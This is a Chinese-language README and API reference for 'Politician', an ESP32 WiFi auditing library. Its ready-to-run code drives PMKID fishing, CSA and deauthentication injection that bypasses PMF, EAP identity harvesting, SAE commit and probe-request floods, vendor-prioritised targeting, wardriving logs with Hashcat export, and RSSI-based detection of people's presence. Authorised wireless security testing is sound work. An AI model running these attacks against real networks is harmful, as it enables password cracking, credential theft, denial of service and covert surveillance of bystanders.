# Politician

> **一款为 ESP32 微控制器设计的先进 WiFi 审计库**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PlatformIO](https://img.shields.io/badge/PlatformIO-Compatible-blue.svg)](https://platformio.org/)

Politician 是一个专为 ESP32 平台 WiFi 安全审计设计的嵌入式 C++ 库。它提供了一套简洁且现代的 API，用于捕获 WPA/WPA2/WPA3 握手包，并利用先进的 802.11 协议技术收集企业级凭据。

## 核心能力

- **PMKID 捕获**：无需客户端断开连接即可从关联响应中提取 PMKID。
- **CSA（信道切换公告）注入**：替代传统去认证攻击的现代方案。
- **企业凭据收集**：从 802.1X 网络中捕获 EAP-Identity 帧。
- **隐藏网络发现**：通过拦截探测响应自动揭露隐藏 SSID。
- **设备指纹识别**：无需关联网络，通过 MAC OUI 和 IE 签名被动识别 150 多个消费级 IoT/智能家居品牌。
- **客户端刺激**：使用 QoS Null Data 帧唤醒睡眠中的移动设备。
- **WPA3/PMF 检测**：智能过滤，自动跳过启用受保护管理帧（PMF）的网络。
- **导出格式**：支持 PCAPNG 捕获文件；可选的 HC22000 文本导出，可直接导入 Hashcat。

## 架构

该库围绕一个非阻塞状态机构建，用于管理信道跳频、目标选择、攻击执行和捕获处理。所有操作都包含在 `politician` 命名空间中。

### 核心组件

| 组件 | 描述 |
|-----------|-------------|
| `Politician` | 管理审计生命周期的主引擎类 |
| `PoliticianFormat` | PCAPNG 捕获序列化；辅助 HC22000 文本导出 |
| `PoliticianStorage` | 可选的 SD 卡日志记录和 NVS 持久化 |
| `PoliticianStress` | 解耦的 DoS/干扰负载传递（可选启用） |
| `PoliticianTypes` | 核心数据结构和枚举 |

### 攻击模式

传统的去认证（Deauthentication）攻击对现代 WPA3 以及启用受保护管理帧（PMF/802.11w）的 WPA2 网络无效。Politician 实现了现代替代方案：

| 模式 | 描述 | 有效性 |
|------|-------------|---------------|
| `ATTACK_PMKID` | 通过伪造认证提取 PMKID | 对所有 WPA2/WPA3-Transition 有效 |
| `ATTACK_CSA` | 信道切换公告注入 | 可绕过 PMF 保护 |
| `ATTACK_DEAUTH` | 传统去认证 (Reason 7) | 仅对未启用 PMF 的 WPA2 有效 |
| `ATTACK_STIMULATE` | 针对睡眠客户端的 QoS Null Data 刺激 | 非侵入式客户端唤醒 |
| `ATTACK_PASSIVE` | 仅监听模式 | 零发送 |
| `ATTACK_ALL` | 启用所有主动攻击向量 | 最大侵略性 |

## 安装

### PlatformIO

在 `platformio.ini` 中添加：

```ini
[env:myboard]
platform = espressif32
board = esp32dev
framework = arduino
lib_deps = 
    Politician
```

或者直接克隆到项目的 `lib/` 目录下：

```bash
cd lib/
git clone https://github.com/0ldev/Politician.git
```

### Arduino IDE

1. 下载库的 ZIP 文件。
2. 在 Arduino IDE 中：**项目 (Sketch)** $\rightarrow$ **包含库 (Include Library)** $\rightarrow$ **添加 .ZIP 库 (Add .ZIP Library)**。
3. 选择下载的 ZIP 文件。

### ESP-IDF

将仓库克隆到项目的 `components/` 目录下：

```bash
cd components/
git clone https://github.com/0ldev/Politician.git
```

创建 `components/Politician/CMakeLists.txt` 组件描述文件：

```cmake
idf_component_register(
    SRCS
        "src/Politician.cpp"
        "src/PoliticianFormat.cpp"
        "src/PoliticianStress.cpp"
    INCLUDE_DIRS "src"
)
```

`PoliticianStorage.h` 在 ESP-IDF 下不可用 —— 如果在 Arduino 之外包含，编译时会触发 `#error`。如需持久化，请直接使用 ESP-IDF 的 VFS 和 `nvs_flash` API。

## 快速上手

### 基础握手捕获

```cpp
#include <Arduino.h>
#include <SD.h>
#include <Politician.h>
#include <PoliticianStorage.h>

using namespace politician;
using namespace politician::storage;

Politician engine;

void onHandshake(const HandshakeRecord &rec) {
    Serial.printf("\n[✓] Captured: %s  ch%d  rssi=%d  type=%d\n",
                  rec.ssid, rec.channel, rec.rssi, rec.type);
    // 主要输出：PCAPNG —— 在 Wireshark 中打开或使用 hcxpcapngtool 转换
    PcapngFileLogger::append(SD, "/captures.pcapng", rec);
}

void setup() {
    Serial.begin(115200);
    SD.begin();

    engine.setEapolCallback(onHandshake);

    Config cfg;
    engine.begin(cfg);
    engine.setAttackMask(ATTACK_ALL);
}

void loop() {
    engine.tick();
}
```

### 纯 ESP-IDF 快速上手

在 ESP-IDF 下，`begin()` 内部会调用 `esp_wifi_init()`，但要求 NVS 和默认事件循环已初始化。请在调用 `begin()` 之前初始化这些项，然后在 FreeRTOS 任务中驱动引擎。

```cpp
#include <nvs_flash.h>
#include <esp_event.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <Politician.h>

using namespace politician;

static Politician engine;

static void on_handshake(const HandshakeRecord &rec) {
    printf("[+] Captured: %s  ch%d  rssi=%d  type=%d\n",
           rec.ssid, rec.channel, rec.rssi, rec.type);
}

static void audit_task(void *) {
    Config cfg;
    engine.setEapolCallback(on_handshake);

    if (engine.begin(cfg) != OK) {
        printf("[!] WiFi init failed\n");
        vTaskDelete(nullptr);
        return;
    }

    engine.setAttackMask(ATTACK_ALL);

    for (;;) {
        engine.tick();
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

extern "C" void app_main(void) {
    nvs_flash_init();
    esp_event_loop_create_default();

    xTaskCreate(audit_task, "politician", 8192, nullptr, 5, nullptr);
}
```

## API 参考

### Politician 类

主引擎类。必须在主循环中调用 `tick()`。

#### 初始化

```cpp
Error begin(const Config& cfg = Config());
```

初始化引擎。成功返回 `OK`，失败返回 `Error` 代码。必须在调用任何其他方法之前调用。

#### 配置结构体

```cpp
struct Config {
    uint16_t hop_dwell_ms           = 200;   // 每个信道的静态停留时间 (ms)
    bool     smart_hopping          = true;  // 基于流量的动态信道停留时间
    uint16_t hop_min_dwell_ms       = 50;    // 未检测到流量时的最小停留时间
    uint16_t hop_max_dwell_ms       = 400;   // 流量活跃时的最大停留时间
    uint32_t m1_lock_ms             = 800;   // 看到 M1 包后在信道上停留的时间
    uint32_t fish_timeout_ms        = 2000;  // 每次 PMKID 关联尝试的超时时间
    uint8_t  fish_max_retries       = 2;     // 在转向 CSA 前的 PMKID 重试次数
    uint32_t csa_wait_ms            = 4000;  // CSA/Deauth 爆发后的等待窗口
    uint8_t  csa_beacon_count       = 8;     // 每次爆发的 CSA Beacon 数量
    uint8_t  deauth_burst_count     = 16;    // 独立去认证爆发的帧数
    uint8_t  csa_deauth_count       = 15;    // CSA 爆发后附加的去认证帧数
    uint16_t probe_aggr_interval_s  = 30;    // 重新攻击同一个 AP 的间隔时间（秒）
    uint32_t session_timeout_ms     = 60000; // 孤立会话在 RAM 中的生存时间
    bool     capture_half_handshakes = false; // 仅捕获 M2 时触发回调并转向主动攻击
    bool     skip_immune_networks   = true;  // 跳过纯 WPA3 / PMF-Required 网络
    uint8_t  capture_filter         = LOG_FILTER_HANDSHAKES | LOG_FILTER_PROBES;
    int8_t   min_rssi               = -100;  // 忽略信号强度低于此值的 AP (dBm)
    uint32_t ap_expiry_ms           = 300000; // 移除长时间未见到的 AP (0 = 永不过期)
    bool     unicast_deauth         = true;  // 发送去认证帧至已知客户端 MAC 而非广播
    uint32_t probe_hidden_interval_ms = 0;   // 探测隐藏 AP SSID 的频率 (0 = 禁用)
    uint8_t  deauth_reason          = 7;     // 去认证帧中的 802.11 原因码
    bool     deauth_reason_cycling  = true;  // 循环尝试有效的原因码 (模糊测试)
    // ── 帧捕获
    bool     capture_group_keys     = false; // 在 GTK 轮换帧上触发 eapolCb(CAP_EAPOL_GROUP)
    // ── 过滤
    uint8_t  min_beacon_count       = 0;     // 攻击/触发 apFoundCb 前必须见到的最小 Beacon 次数 (0 = 关闭)
    uint8_t  max_total_attempts     = 0;     // N 次攻击失败后永久跳过该 BSSID (0 = 无限制)
    uint8_t  sta_filter[6]          = {};    // 仅记录来自此客户端 MAC 的 EAPOL (全零 = 无过滤)
    char     ssid_filter[33]        = {};    // 仅缓存匹配此 SSID 的 AP (为空 = 无过滤)
    bool     ssid_filter_exact      = true;  // True = 精确匹配, false = 子串匹配
    uint8_t  enc_filter_mask        = 0xFF;  // 要缓存的加密类型掩码
    bool     require_active_clients = false; // 如果 AP 上未看到活跃客户端，则跳过启动攻击
};
```

### 高级功能

#### 自主猎手（基于指纹的目标定位）

在使用 `autoTarget` 时，利用内置的 OUI 数据库优先处理特定设备厂商：

```cpp
// 1. 定义目标策略
int hunterScore(const ApRecord &ap, const char *vendor) {
    int score = ap.rssi; // 从信号强度开始
    
    // 优先处理高价值目标
    if (strstr(vendor, "Apple"))   score += 50;
    if (strstr(vendor, "Hikvision")) score += 80; // 安防摄像头
    
    // 忽略无趣的噪声
    if (ap.flags.is_hidden) score -= 100;
    
    return score;
}

void setup() {
    engine.begin();
    engine.setTargetScoreCallback(hunterScore);
    engine.setAutoTarget(true);
    engine.startHopping();
}
```

#### 自定义帧注入与模糊测试

使用精确的信道控制注入任意 802.11 帧：

```cpp
// 用于模糊测试的畸形探测请求 (Malformed Probe Request)
uint8_t malformedFrame[] = { 0x40, 0x00, ... };

void loop() {
    engine.tick();
    
    // 立即在信道 6 注入，并锁定跳频器 100ms
    engine.injectCustomFrame(malformedFrame, sizeof(malformedFrame), 6, 100);
    
    // 队列隐蔽注入（仅当跳频器到达信道 11 时触发）
    engine.injectCustomFrame(malformedFrame, sizeof(malformedFrame), 11, 0, true);
}
```

#### 断开连接策略

通过顺序链接攻击方法优化隐蔽性：

```cpp
void setup() {
    Config cfg;
    engine.begin(cfg);
    
    // 首先尝试 CSA（隐蔽），仅在需要时回退到 Deauth
    engine.setDisconnectionStrategy(STRATEGY_AUTO_FALLBACK);
    
    engine.setAttackMask(ATTACK_CSA | ATTACK_DEAUTH);
}
```

#### 802.11u 互工作发现

发现公共网络的物理场所上下文：

```cpp
void onAp(const ApRecord &ap) {
    if (ap.venue_group != 0) {
        Serial.printf("Venue: Group %d, Type %d\n", ap.venue_group, ap.venue_type);
        // 例如：Group 2 (教育), Type 8 (大学)
    }
}
```

#### 回调函数

```cpp
void setEapolCallback(EapolCb cb);              // 捕获到握手 (EAPOL, PMKID 或组密钥)
void setApFoundCallback(ApFoundCb cb);          // 发现新 AP (遵循 min_beacon_count)
void setIdentityCallback(IdentityCb cb);        // 收集到 802.1X EAP-Identity
void setAttackResultCallback(AttackResultCb cb);// 攻击耗尽且未捕获到数据
void setTargetFilter(TargetFilterCb cb);        // 早期过滤 —— 返回 false 以忽略该 AP
void setPacketLogger(PacketCb cb);              // 混杂模式下的原始帧
void setProbeRequestCallback(ProbeRequestCb cb);// 收到探测请求 (客户端设备历史)
void setDisruptCallback(DisruptCb cb);          // 收到去认证/断开关联帧
void setClientFoundCallback(ClientFoundCb cb);  // 发现新客户端 STA 关联至某个 AP
void setRogueApCallback(RogueApCb cb);          // 在同一信道发现具有相同 SSID 的第二个 BSSID (恶魔孪生)
```

#### 状态与统计

```cpp
bool    isActive()    const;  // 如果帧处理已启用则为 True
bool    isAttacking() const;  // 如果正在进行 PMKID/CSA 攻击则为 True
bool    hasTarget()   const;  // 如果聚焦于特定 BSSID 则为 True
uint8_t getChannel()  const;  // 当前无线电信道
int8_t  getLastRssi() const;   // 最近接收帧的 RSSI
Stats&  getStats();           // 获取帧计数器引用 (捕获数, 失败数等)
Config& getConfig();          // 获取活动配置引用，用于运行时修改
void    resetStats();         // 将所有计数器清零
int     getApCount() const;   // 发现缓存中的 AP 数量
bool    getAp(int idx, ApRecord &out) const;                  // 按索引从缓存读取 AP
bool    getApByBssid(const uint8_t* bssid, ApRecord &out) const; // 通过 BSSID 查找 AP
int     getClientCount(const uint8_t* bssid) const;           // 该 AP 上见到的客户端数量 (0-4)
bool    getClient(const uint8_t* bssid, int idx, uint8_t out_sta[6]) const; // 按索引读取客户端 MAC
```

#### 引擎控制

```cpp
void setActive(bool active);  // 启用或禁用帧处理，无需完整销毁
void setLogger(LogCb cb);     // 将内部日志输出重定向到自定义回调
```

#### 目标与信道控制

```cpp
Error setTarget(const uint8_t* bssid, uint8_t channel); // 聚焦于一个 BSSID
void  clearTarget();                                     // 恢复自主运行
Error setChannel(uint8_t ch);                            // 调谐至特定信道
Error lockChannel(uint8_t ch);                           // 停止跳频，锁定信道
void  startHopping(uint16_t dwellMs = 0);                // 开始信道跳频
void  stopHopping();                                     // 停止跳频 (攻击状态机继续运行)
void  stop();                                            // 完全销毁：中止攻击, 清除目标, 停止跳频, 禁用捕获
void  setChannelList(const uint8_t* channels, uint8_t count); // 限制跳频序列
void  setChannelBands(bool ghz24, bool ghz5);                // 跳频 2.4GHz, 5GHz 或两者
Error setTargetBySsid(const char* ssid);                     // 通过 SSID 锁定目标 (从缓存中选取信号最强的)
void  setAutoTarget(bool enable);                            // 持续自动目标定位最强且未捕获的 AP
```

#### 已捕获列表

```cpp
void markCaptured(const uint8_t* bssid);                       // 永久跳过此 BSSID
void clearCapturedList();                                       // 重置已捕获列表
void setIgnoreList(const uint8_t (*bssids)[6], uint8_t count); // 永久忽略列表
```

#### 攻击控制

```cpp
void setAttackMask(uint8_t mask);                                // 配置活动攻击向量 (位掩码)
void setAttackMaskForBssid(const uint8_t* bssid, uint8_t mask); // 针对单个 BSSID 的覆盖 (最多 8 条)
void clearAttackMaskOverrides();                                  // 移除所有针对 BSSID 的覆盖
```

#### 攻击模式常量

```cpp
#define ATTACK_PMKID        0x01  // 通过伪造关联进行 PMKID fishing
#define ATTACK_CSA          0x02  // 信道切换公告注入
#define ATTACK_PASSIVE      0x04  // 仅监听 —— 零发送
#define ATTACK_DEAUTH       0x08  // 经典去认证 (Reason 7)
#define ATTACK_STIMULATE    0x10  // QoS Null Data 客户端刺激
#define ATTACK_ALL          0x1F  // 所有攻击向量
```

#### 捕获类型常量

```cpp
#define CAP_PMKID        0x01  // 通过伪造关联提取的 PMKID
#define CAP_EAPOL        0x02  // 通过被动捕获获取的完整 M1+M2
#define CAP_EAPOL_CSA    0x03  // 由 CSA/Deauth 触发的完整 M1+M2
#define CAP_EAPOL_HALF   0x04  // 仅 M2 (无 anonce) —— 已触发主动攻击转向
#define CAP_EAPOL_GROUP  0x05  // 非成对 EAPOL-Key (GTK 轮换)
```

#### 捕获过滤常量

```cpp
#define LOG_FILTER_HANDSHAKES   0x01  // EAPOL 和 PMKID (SPI 安全)
#define LOG_FILTER_PROBES       0x02  // 探测请求和响应 (SPI 安全)
#define LOG_FILTER_BEACONS      0x04  // 信标 (Beacon) —— 数据量大，仅限 SDMMC
#define LOG_FILTER_PROBE_REQ    0x08  // 作为原始 EPB 的探测请求 (SPI 安全)
#define LOG_FILTER_MGMT_DISRUPT 0x10  // 作为原始 EPB 的去认证/断开关联帧 (SPI 安全)
#define LOG_FILTER_ALL          0xFF  // 全部 —— 仅限 SDMMC
```

### 数据结构

#### Stats (统计)

```cpp
struct Stats {
    uint32_t total;              // 接收到的总帧数
    uint32_t mgmt;               // 管理帧
    uint32_t ctrl;               // 控制帧
    uint32_t data;               // 数据帧
    uint32_t eapol;              // 检测到的 EAPOL 帧
    uint32_t pmkid_found;        // 捕获的 PMKID 数量
    uint32_t beacons;            // 信标和探测响应帧
    uint32_t captures;           // 成功的总捕获数
    uint32_t failed_pmkid;       // PMKID 尝试耗尽且未捕获
    uint32_t failed_csa;         // CSA/Deauth 窗口过期且未收到 EAPOL
    uint16_t channel_frames[14]; // 每个 2.4GHz 信道的帧数 (索引 0 = ch1 … 索引 13 = ch14)
};
```

#### HandshakeRecord (握手记录)

```cpp
struct HandshakeRecord {
    uint8_t  type;           // CAP_PMKID / CAP_EAPOL / CAP_EAPOL_CSA / CAP_EAPOL_HALF / CAP_EAPOL_GROUP
    uint8_t  channel;
    int8_t   rssi;
    uint8_t  bssid[6];
    uint8_t  sta[6];         // 客户端 (station) MAC
    char     ssid[33];
    uint8_t  ssid_len;
    uint8_t  enc;            // 0=Open, 1=WEP, 2=WPA, 3=WPA2/WPA3, 4=Enterprise
    // PMKID 路径
    uint8_t  pmkid[16];
    // EAPOL 路径
    uint8_t  anonce[32];
    uint8_t  mic[16];
    uint8_t  eapol_m2[256];
    uint16_t eapol_m2_len;
    bool     has_mic;
    bool     has_anonce;
};
```

#### EapIdentityRecord (EAP 身份记录)

```cpp
struct EapIdentityRecord {
    uint8_t bssid[6];       // 接入点 MAC
    uint8_t client[6];      // 企业客户端 MAC
    char    identity[65];   // 明文身份 / 电子邮件
    uint8_t channel;
    int8_t  rssi;
};
```

#### ApRecord (AP 记录)

```cpp
struct ApRecord {
    uint8_t bssid[6];
    char    ssid[33];
    uint8_t ssid_len;
    uint8_t channel;
    int8_t  rssi;
    uint8_t enc;           // 0=Open, 1=WEP, 2=WPA, 3=WPA2/WPA3, 4=Enterprise
    bool    wps_enabled;   // 在信标/探测响应中检测到 WPS IE
    bool    pmf_capable;     // MFPC — AP 支持受保护管理帧
    bool    pmf_required;    // MFPR — AP 强制要求 PMF (纯 WPA3 / PMF-Required)
    uint8_t total_attempts;  // 针对此 BSSID 的失败攻击尝试次数
    bool    captured;        // 如果 BSSID 在已捕获或忽略列表中则为 True
    bool     ft_capable;      // 宣称支持 802.11r FT AKM (FT-PSK suite 4 或 FT-EAP suite 3)
    uint32_t first_seen_ms;   // 首次观察到该 AP 的 millis() 时间戳
    uint32_t last_seen_ms;    // 最近一次信标或探测响应的 millis() 时间戳
    char     country[3];      // 来自 IE 7 的 ISO 3166-1 alpha-2 国家代码 (例如 "US")，缺失则为空
    uint16_t beacon_interval; // 宣称的信标间隔，单位为 TU (1 TU = 1024 µs)，未知则为 0
    uint8_t  max_rate_mbps;   // 来自 Supported Rates IE 的最高传统数据速率 (Mbps)，未知则为 0
};
```

#### AttackResultRecord (攻击结果记录)

```cpp
enum AttackResult : uint8_t {
    RESULT_PMKID_EXHAUSTED = 1,  // 所有 PMKID 重试均失败
    RESULT_CSA_EXPIRED     = 2,  // CSA/Deauth 窗口关闭，未收到 EAPOL
};

struct AttackResultRecord {
    uint8_t      bssid[6];
    char         ssid[33];
    uint8_t      ssid_len;
    AttackResult result;
};
```

#### RogueApRecord (非法 AP 记录)

```cpp
struct RogueApRecord {
    uint8_t known_bssid[6]; // 已缓存具有此 SSID 的第一个 AP 的 BSSID
    uint8_t rogue_bssid[6]; // 共享相同 SSID 的新观察到 AP 的 BSSID
    char    ssid[33];       // 共享的 SSID
    uint8_t ssid_len;
    uint8_t channel;        // 检测到冲突的信道
    int8_t  rssi;           // 非法 AP 的信号强度 (dBm)
};
```

#### ProbeRequestRecord (探测请求记录)

```cpp
struct ProbeRequestRecord {
    uint8_t client[6];   // 发起探测的设备 MAC
    uint8_t channel;
    int8_t  rssi;
    char    ssid[33];    // 请求的 SSID (为空 = 通配符探测)
    uint8_t ssid_len;
    bool    rand_mac;    // 如果设置了本地管理位则为 True (iOS/Android MAC 随机化)
};
```

#### DisruptRecord (干扰记录)

```cpp
struct DisruptRecord {
    uint8_t  src[6];     // 帧源 MAC
    uint8_t  dst[6];     // 帧目的 MAC
    uint8_t  bssid[6];   // BSSID (addr3)
    uint16_t reason;     // 802.11 原因码
    uint8_t  subtype;    // MGMT_SUB_DEAUTH (0xC0) 或 MGMT_SUB_DISASSOC (0xA0)
    uint8_t  channel;
    int8_t   rssi;
    bool     rand_mac;   // 如果源 MAC 设置了本地管理位 (随机化) 则为 True
};
```

### 格式工具

PCAPNG 是主要的捕获格式 —— 它与工具无关，保留完整的帧上下文，可以用 Wireshark 打开或通过 `hcxpcapngtool` 处理。HC22000 是一项辅助文本导出，适用于希望直接将捕获内容喂给 `hashcat` 而无需中间转换步骤的用户。

```cpp
// 将 HandshakeRecord 转换为 HC22000 字符串 (辅助用途 —— 请使用 PCAPNG 作为主要输出)
String toHC22000(const HandshakeRecord& rec);

// 写入 PCAPNG 全局头 (SHB + IDB) —— 在文件开始时调用一次
size_t writePcapngGlobalHeader(uint8_t* buffer);

// 将 HandshakeRecord 序列化为 PCAPNG 增强数据包块 (EPB)
size_t writePcapngRecord(const HandshakeRecord& rec, uint8_t* buffer, size_t max_len);

// 将原始 802.11 帧序列化为 PCAPNG 增强数据包块 (EPB)
size_t writePcapngPacket(const uint8_t* payload, size_t len,
                        int8_t rssi, uint8_t channel, uint64_t ts_usec, 
                        uint8_t* buffer, size_t max_len);```

### 压力测试工具 (可选)

需要 `#include <PoliticianStress.h>`。除非明确包含，否则不会被链接。

```cpp
// 使用 SAE Commit 帧向 WPA3 AP 发送洪水攻击，以耗尽其抗阻塞令牌堆栈
stress::saeCommitFlood(const uint8_t* bssid, uint32_t count = 1000);

// 向附近的 AP 发送随机探测请求洪水，以饱和关联队列
stress::probeRequestFlood(uint32_t count = 1000);
```

### 存储工具 (可选)

需要 `#include <PoliticianStorage.h>`。

```cpp
// 将握手追加到 PCAPNG 文件 (自动写入全局头)
PcapngFileLogger::append(fs::FS& fs, const char* path,
                         const HandshakeRecord& rec);

// 将原始 802.11 帧追加到 PCAPNG 文件
PcapngFileLogger::appendPacket(fs::FS& fs, const char* path,
                               const uint8_t* payload, uint16_t len,
                               int8_t rssi, uint32_t ts_usec);

// 将握手详情追加到 Wigle CSV
WigleCsvLogger::append(fs::FS& fs, const char* path,
                       const HandshakeRecord& rec, float lat, float lon,
                       float alt = 0.0, float acc = 10.0,
                       const char* timestamp = nullptr);  // 例如 "2024-06-01 14:30:00"

// 将任何发现的 AP 追加到 Wigle CSV (与 setApFoundCallback 配合使用)
WigleCsvLogger::appendAp(fs::FS& fs, const char* path,
                         const ApRecord& ap, float lat, float lon,
                         float alt = 0.0, float acc = 10.0,
                         const char* timestamp = nullptr);

// 将握手追加到 HC22000 文本文件
Hc22000FileLogger::append(fs::FS& fs, const char* path,
                           const HandshakeRecord& rec);

// 将收集到的企业身份追加到 CSV
EnterpriseCsvLogger::append(fs::FS& fs, const char* path,
                            const EapIdentityRecord& rec);
```

## 使用示例

### 定向网络审计

使用回调函数根据信号强度、加密类型或 SSID 模式过滤网络：

```cpp
engine.setTargetFilter([](const politician::ApRecord &ap) {
    // 仅审计强信号网络
    if (ap.rssi < -70) return false;
    
    // 跳过 Open/WEP 网络
    if (ap.enc < 3) return false;
    
    // 跳过公司网络  
    if (strstr(ap.ssid, "CORP-") != nullptr) return false;
    
    return true;
});
```

### 选择性攻击模式

```cpp
// 现代仅 CSA 模式 (绕过 PMF)
engine.setAttackMask(ATTACK_CSA);

// 针对旧版网络的经典去认证攻击
engine.setAttackMask(ATTACK_DEAUTH);

// 结合客户端刺激的被动监听
engine.setAttackMask(ATTACK_PASSIVE | ATTACK_STIMULATE);

// 全力进攻
engine.setAttackMask(ATTACK_ALL);
```

### 企业凭据收集

```cpp
void onIdentity(const EapIdentityRecord &rec) {
    char bssid[18];
    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             rec.bssid[0], rec.bssid[1], rec.bssid[2],
             rec.bssid[3], rec.bssid[4], rec.bssid[5]);
    Serial.printf("[802.1X] %s → %s\n", bssid, rec.identity);
    EnterpriseCsvLogger::append(SD, "/identities.csv", rec);
}

void setup() {
    engine.setIdentityCallback(onIdentity);

    Config cfg;
    cfg.hop_dwell_ms = 800;  // EAP 交换需要更长的停留时间
    engine.begin(cfg);
}
```

### 持久化存储

核心库与文件系统依赖解耦。可选择包含 `PoliticianStorage.h` 以实现 SD 卡日志记录：

```cpp
#include <PoliticianStorage.h>
#include <SD.h>

using namespace politician::storage;

void onHandshake(const HandshakeRecord &rec) {
    // 追加到 PCAPNG 文件 (自动创建文件头)
    PcapngFileLogger::append(SD, "/captures.pcapng", rec);
}

void onPacket(const uint8_t* payload, uint16_t len, int8_t rssi, uint8_t channel, uint32_t ts) {
    // 记录原始 802.11 帧
    PcapngFileLogger::appendPacket(SD, "/intel.pcapng", payload, len, rssi, channel, ts);
}

void setup() {
    SD.begin();
    engine.setEapolCallback(onHandshake);
    engine.setPacketLogger(onPacket);
    
    Config cfg;
    cfg.capture_filter = LOG_FILTER_HANDSHAKES | LOG_FILTER_PROBES;
    engine.begin(cfg);
}
```

**⚠️ 日志性能警告**

信标记录 (`LOG_FILTER_BEACONS`) 每秒可能会产生 500 次以上的写入。标准 SPI SD 卡写入是**阻塞**的，会导致引擎冻结。对于海量日志记录，请使用具有原生 **SDMMC** (4-bit) 硬件支持和 DMA 的 ESP32 开发板。

### GPS 集成 (Wigle.net)

结合 GPS 模块用于构建 wardriving 数据集：

```cpp
#include <TinyGPS++.h>

TinyGPSPlus gps;

// 记录每个发现的 AP (对 ApRecord 使用 appendAp)
void onAp(const ApRecord &ap) {
    if (gps.location.isValid()) {
        WigleCsvLogger::appendAp(SD, "/wardrive.csv", ap,
                                 gps.location.lat(),
                                 gps.location.lng());
    }
}

// 记录带有 GPS 上下文的握手 (对 HandshakeRecord 使用 append)
void onHandshake(const HandshakeRecord &rec) {
    if (gps.location.isValid()) {
        WigleCsvLogger::append(SD, "/wardrive.csv", rec,
                               gps.location.lat(),
                               gps.location.lng());
    }
}
```

## 高级特性

### 半握手与智能转向 (Smart Pivot)

当 `cfg.capture_half_handshakes = true` 时，在仅捕获到 M2 包的情况下，引擎会触发 `type = CAP_EAPOL_HALF` 的 EAPOL 回调。这些记录没有 `anonce`，因此无法直接破解，但它们确认了当前有活跃客户端存在。

随后，引擎会立即执行 **智能转向 (Smart Pivot)**：
1. 将该网络标记为有活跃客户端。
2. 发起 CSA/Deauth 强制触发新的 4 次握手。
3. 在重新连接时捕获完整的 M1+M2。

### 攻击结果回调

注册 `setAttackResultCallback()`，以便在攻击尝试所有选项但未捕获到数据时收到通知。这对于记录失败目标或运行时调整策略非常有用：

```cpp
engine.setAttackResultCallback([](const AttackResultRecord &res) {
    char bssid[18];
    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             res.bssid[0], res.bssid[1], res.bssid[2],
             res.bssid[3], res.bssid[4], res.bssid[5]);
    if (res.result == RESULT_PMKID_EXHAUSTED)
        Serial.printf("[!] PMKID failed: %s (%s)\n", res.ssid, bssid);
    else if (res.result == RESULT_CSA_EXPIRED)
        Serial.printf("[!] CSA/Deauth timed out: %s (%s)\n", res.ssid, bssid);
});
```

### 802.11r 快速切换检测

引擎能在信标和探测响应的 RSN IE 中检测到 802.11r 快速切换 AKM (FT-PSK suite type 4, FT-EAP suite type 3)。检测到后，`ApRecord.ft_capable` 将被设为 `true`，并在 PMKID fishing 期间发出日志提示。

对于 FT 转换模式 AP（同时宣称支持 FT-PSK 和常规 WPA2-PSK），通过 WPA2-PSK 路径进行的标准 PMKID 捕获可以正常工作。对于仅支持 FT 的 AP，捕获的 PMKID 是 FT 派生的 —— 请将其保存为 PCAPNG 并使用支持 FT 的离线工具（如 `hcxpcapngtool --enable_ft`）进行破解。

### 隐藏网络发现

由去认证爆发触发的探测响应（Probe Response）帧会自动揭露隐藏的 SSID。引擎会自动缓存这些信息，无需任何配置。

### PMF/WPA3 检测

RSNE (强安全网络元素) 解析会自动识别要求 PMF 的网络。为了节省时间，这些网络将被跳过，但 WPA3 转换模式网络（支持 PMF 但不强制要求）仍会被作为目标。

`ApRecord` 公开了 `pmf_capable` 和 `pmf_required` 属性，因此 `setTargetFilter` 回调可以做出比二进制 `skip_immune_networks` 配置项更精细的决策 —— 例如，仅针对 WPA3 转换网络（支持但非强制 PMF）。

### 被动式运动与存在感应 (PoliticianSense)

`PoliticianSense.h` 挂载到引擎的混杂模式数据包流上，通过测量来自固定锚点 AP 的 RSSI 方差来检测人类的存在和运动 —— 无需额外硬件，无需切换模式，且与审计引擎无任何冲突。

人体在锚点 AP 与 ESP32 之间走动时会吸收和散射 2.4 GHz 无线电波，导致接收到的信标信号强度产生可测量的波动。`PoliticianSense` 在可配置的滑动窗口内跟踪方差，并在空间状态在静止与活跃之间转换时触发回调。

> **范围:** 使用单个 ESP32，您只能获得 **存在/运动检测**，而无法进行定位。要知道人在空间中的具体位置，需要多个观测点。

```cpp
#include <Politician.h>
#include <PoliticianSense.h>
using namespace politician;

Politician      engine;
PoliticianSense sense;

void setup() {
    Config cfg;
    cfg.capture_filter |= LOG_FILTER_BEACONS; // 必需 — 在 engine.begin() 之前设置
    engine.begin(cfg);
    engine.startHopping();

    // 在绑定锚点前配置参数
    sense.setThreshold(6.0f);  // 触发“运动 (MOTION)”的方差阈值 (dBm²)
    sense.setWindowSize(32);   // 滑动窗口的样本数 (10 个信标/秒时约 3 秒)
    sense.setDebounce(2000);   // 保持“运动”状态直到恢复为“静止”的延迟时间 (ms)

    sense.setSenseCallback([](SenseEvent ev, float var) {
        Serial.printf("[SENSE] %s  var=%.2f dBm²\n",
                      ev == SENSE_MOTION ? "MOTION" : "STILL", var);
    });

    // 通过 BSSID 绑定到特定 AP 锚点 (最稳定)
    uint8_t anchor[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
    sense.begin(engine, anchor);

    // 锁定到锚点所在的信道，以获得稳定的大约 10 次/秒的信标流
    engine.lockChannel(6);
}

void loop() {
    engine.tick();
    sense.tick();
}
```

**锚点模式:**

| 模式 | 方法 | 说明 |
|------|--------|-------|
| BSSID (推荐) | `sense.begin(engine, bssid)` | 最稳定；不受 SSID 名称更改的影响 |
| SSID 查找 | `sense.beginBySSID(engine, "MyRouter")` | 如果有多个匹配项，则选择信号最强的 BSSID |
| 任意 AP | `sense.begin(engine, nullptr)` | 聚合所有可见的 AP；基线噪声较大 |

**API 参考:**

| 方法 | 描述 |
|--------|-------------|
| `begin(engine, bssid)` | 附加到引擎；开始从锚点 BSSID 采样 |
| `beginBySSID(engine, ssid)` | 从引擎缓存中通过 SSID 解析 BSSID，然后附加 |
| `end()` | 从引擎分离并清除其数据包日志记录器插槽 |
| `tick()` | 工作函数 — 在 `loop()` 中与 `engine.tick()` 一起调用 |
